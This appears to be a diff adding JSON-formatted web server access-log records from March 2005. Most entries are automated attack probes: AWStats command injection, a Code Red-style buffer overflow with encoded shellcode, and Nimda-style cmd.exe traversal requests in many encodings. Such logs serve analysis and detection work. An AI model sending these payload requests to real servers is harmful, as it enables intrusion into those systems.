+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:53Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:52Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:53Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:52Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:53Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:53Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:52Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:52Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:52Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:53Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:54Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:54Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:55Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:55Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:55Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:55Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:56Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:56Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:57Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:57Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:57Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:58Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:58Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:58Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:58Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:58Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:58Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:59Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:59Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:59Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:59Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:59Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:59Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:59Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:00Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:00Z"), "path": "//cgi-bin/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:00Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:00Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:00Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:00Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:00Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:00Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:01Z"), "path": "//cgi/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:01Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:02Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:07:04Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "201.9.48.227", "date": ISODate("15/Mar/2005:06:41:13Z"), "path": "/default.ida", "request": "GET /default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a HTTP/1.0" }
+{"host": "217.204.59.69", "date": ISODate("15/Mar/2005:07:53:14Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "218.6.162.19", "date": ISODate("15/Mar/2005:11:24:02Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "24.11.17.100", "date": ISODate("15/Mar/2005:15:07:49Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "65.96.54.37", "date": ISODate("15/Mar/2005:18:58:33Z"), "path": "/NULL.printer", "request": "GET /NULL.printer" }
+{"host": "195.70.152.248", "date": ISODate("15/Mar/2005:22:20:33Z"), "path": "/NULL.printer", "request": "GET /NULL.printer" }
+{"host": "62.6.139.11", "date": ISODate("15/Mar/2005:23:45:24Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "211.158.94.106", "date": ISODate("16/Mar/2005:00:09:48Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:42Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:42Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:42Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:42Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:42Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:42Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:42Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "207.228.251.216", "date": ISODate("16/Mar/2005:01:01:43Z"), "path": "/sumthin", "request": "GET /sumthin HTTP/1.0" }
+{"host": "218.11.95.43", "date": ISODate("16/Mar/2005:02:45:42Z"), "path": "/scripts/root.exe?/c+dir", "request": "GET /scripts/root.exe?/c+dir HTTP/1.0" }
+{"host": "218.11.95.43", "date": ISODate("16/Mar/2005:02:45:46Z"), "path": "/MSADC/root.exe?/c+dir", "request": "GET /MSADC/root.exe?/c+dir HTTP/1.0" }
+{"host": "218.11.95.43", "date": ISODate("16/Mar/2005:02:45:50Z"), "path": "/c/winnt/system32/cmd.exe?/c+dir", "request": "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "218.11.95.43", "date": ISODate("16/Mar/2005:02:45:54Z"), "path": "/d/winnt/system32/cmd.exe?/c+dir", "request": "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "218.11.95.43", "date": ISODate("16/Mar/2005:02:45:55Z"), "path": "/scripts/..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "218.11.95.43", "date": ISODate("16/Mar/2005:02:46:00Z"), "path": "/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "218.11.95.43", "date": ISODate("16/Mar/2005:02:46:01Z"), "path": "/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "218.11.95.43", "date": ISODate("16/Mar/2005:02:46:02Z"), "path": "/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.67.42.139", "date": ISODate("16/Mar/2005:05:40:40Z"), "path": "/scripts/nsiislog.dll", "request": "GET /scripts/nsiislog.dll HTTP/1.1" }
+{"host": "66.134.74.113", "date": ISODate("16/Mar/2005:06:11:36Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "204.102.106.121", "date": ISODate("16/Mar/2005:07:29:44Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "68.166.35.226", "date": ISODate("16/Mar/2005:08:48:01Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "61.10.7.209", "date": ISODate("16/Mar/2005:08:53:44Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "207.243.156.65", "date": ISODate("16/Mar/2005:09:34:15Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:23Z"), "path": "/scripts/root.exe?/c+dir", "request": "GET /scripts/root.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:24Z"), "path": "/MSADC/root.exe?/c+dir", "request": "GET /MSADC/root.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:24Z"), "path": "/c/winnt/system32/cmd.exe?/c+dir", "request": "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:25Z"), "path": "/d/winnt/system32/cmd.exe?/c+dir", "request": "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:25Z"), "path": "/scripts/..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:25Z"), "path": "/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:26Z"), "path": "/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:26Z"), "path": "/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:26Z"), "path": "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:27Z"), "path": "/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:27Z"), "path": "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:27Z"), "path": "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:27Z"), "path": "/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:28Z"), "path": "/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:28Z"), "path": "/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "71.16.50.10", "date": ISODate("16/Mar/2005:10:35:28Z"), "path": "/scripts/..%252f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "66.171.199.116", "date": ISODate("16/Mar/2005:12:42:10Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "64.83.24.184", "date": ISODate("16/Mar/2005:13:23:40Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "66.30.71.74", "date": ISODate("16/Mar/2005:13:46:56Z"), "path": "/NULL.printer", "request": "GET /NULL.printer" }
+{"host": "208.62.177.10", "date": ISODate("16/Mar/2005:14:29:06Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:28Z"), "path": "/scripts/root.exe?/c+dir", "request": "GET /scripts/root.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:29Z"), "path": "/MSADC/root.exe?/c+dir", "request": "GET /MSADC/root.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:31Z"), "path": "/c/winnt/system32/cmd.exe?/c+dir", "request": "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:32Z"), "path": "/d/winnt/system32/cmd.exe?/c+dir", "request": "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:33Z"), "path": "/scripts/..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:34Z"), "path": "/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:35Z"), "path": "/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:36Z"), "path": "/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:38Z"), "path": "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:39Z"), "path": "/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:41Z"), "path": "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:42Z"), "path": "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:43Z"), "path": "/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:44Z"), "path": "/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:45Z"), "path": "/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "209.120.201.177", "date": ISODate("16/Mar/2005:14:29:46Z"), "path": "/scripts/..%252f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "65.16.76.54", "date": ISODate("16/Mar/2005:15:45:05Z"), "path": "/_vti_bin/_vti_aut/fp30reg.dll", "request": "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" }
+{"host": "65.16.76.54", "date": ISODate("16/Mar/2005:15:50:30Z"), "path": "/_vti_bin/_vti_aut/fp30reg.dll", "request": "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" }
